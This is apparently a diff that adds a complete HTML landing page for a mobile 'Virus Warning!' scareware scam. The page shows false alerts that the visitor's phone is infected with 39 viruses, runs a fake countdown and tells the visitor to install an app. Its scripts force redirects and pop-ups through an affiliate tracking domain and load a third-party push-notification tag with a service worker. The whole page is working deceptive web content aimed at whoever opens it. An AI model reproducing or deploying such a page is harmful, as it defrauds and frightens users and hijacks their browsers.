@@ -1,0 +1,244 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAMAAAANIilAAAAA21BMVEUAAAAAqGAAnVoAtWoAqWIAs2gAtGgAm1kAm1oAm1oAtGgAmlkAtGgAtWkAs2gAmloAm1kAtGgAtWgAm1kAmlkAtWcAqmMAnFoAtGgAtGgAmlkAnFoAs2gAs2gAm1oAmloAtGgA0XoAmln///8ApV/u/v8AwG8Ay3YAn1zr+/0AumwZtWsb0n0A0HP1//8Ax3QOtGkAq2Pd9vMArVEAsFloxpkAzWeu68wO0Hrl+vGl28eU1bon0n4Azm1d25nS8+eX5r5z36mc2ME71otRvoi96tiC4rAqt3QAyldAMCWwAAAAIHRSTlMAD05NHPW8r5Lzq25bPOfSwJFnPtx9MCbcx59eJ9CB5TOG1E0AAAMVSURBVEjH1dfJYtowFAVQCHMYwgwJGR5ClowwZgihpIEAzdD+/xdVAtnPRhTi7Hp3LI6v9IwMjp1I4jKVy1zEvpFkNQ0MbErKnWQ0GU9U2oIBACGE2vXsRfyr8LZQuQMmQIUSxSm5ynZa8XOuWK2kS8DYTooRB2qTvbcfytlOTV7BVIVqo1G5vG6nBNOdwEa8ywFg4ntq5+rlTPY+nw9u4zYNQiqmIEoZiVWo9sSmMupTueXjyxEEIrREvOunJJBJxrNFnwkmoZaI8QK4BFLTOLFb50gy7TBgZjKZUMkvgviQYbOZkxhzHP8/zQOZ8TebBzB7nMH4O83jwQzen95B6qjN0j4+fUz7059KR2nWdupalmu9zMbjSM3a9mXc9W8YRGhGa1l9a/o+O40Xy+XSQaytJXO+2RnO5/Ohp3nQWmf2LO1wu/nsrrRehOzRaRcV1tb5cHvu+nW+3FnnwA5AYzzPxZTY40V3+KOn8iy1snPTapxranxb0tgZvj33PO04znyr5qztTFof04eWxsk2A8EVXr32pfS659u+7DUt2IRexTWOpxXGZq3/bPu9oxYIoRl8ejIAhReL1abnZbqRF9L2V8hOJM76uCHxSN8pNTFM2OKJtPM+Luh7ZWrT6mHXfNyU4xb8mFb25dG3OK+kZDgxkNjUaMNbvvEobtrUbh9tcMsdT+K329RoQ6uutwI4eafWbWoXrbFqTIVhNWp3g3MOzto/Ung2BA/qzXq6/lwpaxaX45rhvNXIUK+6b93VAq35DcFUAVQ1asmHzgLMYrzJWH2tq5HLRxk/WnyPzKzG8PPFWM3O/Uraxo7xdAA/3UyNUeOpNhbOjUUf3OPQ2QJ2ChN8ChipSgyjkD7YMD67ji0ctdlMCT4EMOHzATyM0eKkj6ZYElobmBobNpJIhfcdtpnY6RQgqHnYGsMydErtm/EgnthoTydRUlqMuMI4Knoj7fk0r6WWXLZz748+JfdffUWpgOTKCyVVbT3C61UiLfZ8T0k2GenFqpBOCSbAtinN3dRiUVNsXLZTuXom34z9K38BAetViJSD+24AAAAASUVORK5CYII=" rel="shortcut icon" type="image/x-icon">
+    <title>Virus Warning!</title>
+
+    <style>
+        #timer p,
+        p {
+            color: #555
+        }
+
+        #error,
+        #timer {
+            display: inline-block;
+            float: left
+        }
+
+        #timer p,
+        .btn {
+            font-weight: 700
+        }
+
+        body {
+            font-family: sans-serif
+        }
+
+        a {
+            text-decoration: none
+        }
+
+        footer,
+        header,
+        section {
+            clear: both
+        }
+
+        * {
+            margin: 0;
+            padding: 0
+        }
+
+        #wrapper {
+            max-width: 100%;
+            padding: 5px
+        }
+
+        h1 {
+            font-size: 20px
+        }
+
+        p {
+            font-size: 14px;
+            padding: 5px 0
+        }
+
+        #timer {
+            max-width: 290px;
+            width: 65%
+        }
+
+        #timer p {
+            font-size: 12px
+        }
+
+        #error {
+            max-width: 120px;
+            width: 35%
+        }
+
+        #error img {
+            width: 100%
+        }
+
+        a#randombutton {
+            background-color: #6d96f1;
+            border-radius: 5px;
+            color: #fff;
+            display: block;
+            line-height: 50px;
+            max-width: 275px;
+            width: 90%;
+            text-align: center;
+            margin: 0px auto;
+        }
+
+        .btn {
+            background-color: #6d96f1;
+            border-radius: 5px;
+            color: #fff;
+            display: block;
+            line-height: 50px;
+            max-width: 275px;
+            width: 90%
+        }
+
+        .red {
+            color: red
+        }
+    </style>
+</head>
+<body class="" onload="translate(1)" onclick="goto();">
+<audio autoplay="autoplay" preload="" loop="">
+</audio>
+<script src="./jquery.min.js"></script>
+
+<script>
+    function contains(string, fragment) {
+        string = string.toLowerCase();
+        fragment = fragment.toLowerCase();
+        return string.indexOf(fragment) !== -1;
+    }
+
+    function getURLParameter(name) {
+        var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+
+        if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+            result = 'Phone'
+        }
+
+        if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+            result = 'Phone'
+        }
+
+        if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+            result = 'Internet Browser'
+        }
+
+        if(result==null||result==""){
+            result = 'Phone'
+        }
+
+        return result;
+
+    }
+
+</script>
+
+<script language="JavaScript" type="text/javascript">
+    var sec = 59;
+    var min = 04;
+
+    function countDown() {
+        sec--;
+        if (sec == -01) {
+            sec = 59;
+            min = min - 1;
+        } else {
+            min = min;
+        }
+        if (sec <= 9) {
+            sec = "0" + sec;
+        }
+        time = (min <= 9 ? "" + min : min) + " minutes and! " + sec + " seconds";
+        if (document.getElementById) {
+            document.getElementById('theTime').innerHTML = time;
+        }
+        SD = window.setTimeout("countDown();", 1000);
+        if (min == '00' && sec == '00') {
+            sec = "00";
+            window.clearTimeout(SD);
+        }
+    }
+
+    window.onload = countDown;
+</script>
+<script>
+    $(document).ready(function () {
+        alert("ATTENTION - Viruses found!\nYour " + getURLParameter("device_brand") + " is severely damaged by (39) viruses! Soon your " + getURLParameter("device_brand") + " SIM card will be corrupt and it will damage your contacts, photos, data, applications, etc ..");
+
+    });
+</script>
+
+
+<div id="wrapper">
+    <header><img src="./logo2.png"></header>
+    <section>
+        <h1><span id="headingtext">Your <script>document.write(getURLParameter("device_model"))</script> is severly damaged by (39) viruses</span></h1>
+    </section>
+    <section>
+        <!-- Third -->
+
+
+        <div id="timer">
+            <p><span class="red" id="redtext">We've noticed that your <script>document.write(getURLParameter("device_brand"))</script> is 28.1% Damaged by (30) harmful viruses from recent adult sites. It will soon corrupt your Phone's SIM card and damage your contacts, photos, data, and applications.</span>
+            </p>
+            <p>
+            </p>
+            <span style="font-size:18px;font-weight:bold;color:red;font-family:sans-serif;" id="theTime">4 minutes and! 29 seconds</span>
+        </div>
+    </section>
+    <section>
+        <p><b><span id="text3">If you don't remove the virus now, it will cause serious damage to your Phone. Here's what you need to do (step by step):</span></b>
+            <br>
+            <br><span id="text4">Step 1: Tap and install  app for free on the Google Play!</span>
+            <br>
+            <br>
+            <span id="text5">Step 2: Open the application to speed up and fix your browser now!</span></p>
+    </section>
+    <footer>
+        <p align="center">  
+                <a id="offer_split" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3" onclick="ctaclick();" > 
+                             <span class="btn"><span id="randombutton">Repair Now<span class="btn"></span></span></span></a></p>
+    </footer>
+</div>
+
+<script>
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
+    }
+    
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3");
+    }
+
+</script>
+
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+  </script>
+
+
+
+ </body></html>
